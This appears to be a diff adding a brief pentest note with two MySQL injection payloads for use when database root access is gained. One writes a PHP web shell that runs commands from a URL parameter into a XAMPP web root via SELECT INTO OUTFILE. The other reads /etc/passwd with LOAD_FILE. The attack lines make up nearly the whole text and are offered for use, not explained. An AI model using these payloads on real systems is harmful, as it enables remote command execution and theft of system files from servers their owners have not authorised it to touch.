@@ -1,0 +1,8 @@
+If root, then try this:
+
+SELECT "<?php system($_GET['cmd']); ?>"
+INTO OUTFILE "/opt/lampp/htdocs/tsoat.php";
+
+or 
+
+SELECT LOAD_FILE("/etc/passwd");
